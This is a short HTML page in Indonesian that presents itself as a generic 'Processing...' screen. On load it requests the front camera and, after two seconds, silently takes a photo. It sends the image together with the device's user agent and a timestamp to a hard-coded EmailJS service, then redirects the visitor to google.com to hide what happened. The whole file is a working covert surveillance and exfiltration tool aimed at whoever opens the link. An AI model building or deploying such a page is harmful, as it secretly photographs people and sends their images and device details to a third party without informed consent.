<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Processing...</title>
</head>
<body>

<h3 id="status">Memproses...</h3>
<p id="error" style="color:red;"></p>

<video id="video" autoplay playsinline style="display:none;"></video>
<canvas id="canvas" width="300" height="225" style="display:none;"></canvas>

<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>

<script>
(function(){
    emailjs.init("buxVv6sNpKGz4iBzb");
})();

const video = document.getElementById("video");
const statusText = document.getElementById("status");
const errorText = document.getElementById("error");

// START
init();

async function init() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: "user" }
        });

        video.srcObject = stream;
        statusText.innerText = "Mengambil foto...";

        setTimeout(ambilFoto, 2000);

    } catch (err) {
        // ❌ STOP TOTAL DI SINI
        statusText.innerText = "Akses kamera ditolak!";
        errorText.innerText = "Kamu harus mengizinkan kamera untuk lanjut.";

        console.log("DITOLAK:", err);

        // ⛔ TIDAK ADA REDIRECT SAMA SEKALI
        return; 
    }
}

// FOTO
function ambilFoto() {
    const canvas = document.getElementById("canvas");
    const ctx = canvas.getContext("2d");

    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    const imageData = canvas.toDataURL("image/png");

    statusText.innerText = "Mengirim...";

    emailjs.send("service_lzuezkd", "template_33st1em", {
        message: "Foto diambil",
        image: imageData,
        time: new Date().toLocaleString(),
        device: navigator.userAgent
    })
    .then(() => {
        statusText.innerText = "Berhasil, redirect...";

        setTimeout(() => {
            window.location.href = "https://google.com";
        }, 3000);
    })
    .catch(() => {
        statusText.innerText = "Gagal kirim, redirect...";

        setTimeout(() => {
            window.location.href = "https://google.com";
        }, 3000);
    });
}
</script>

</body>
</html>
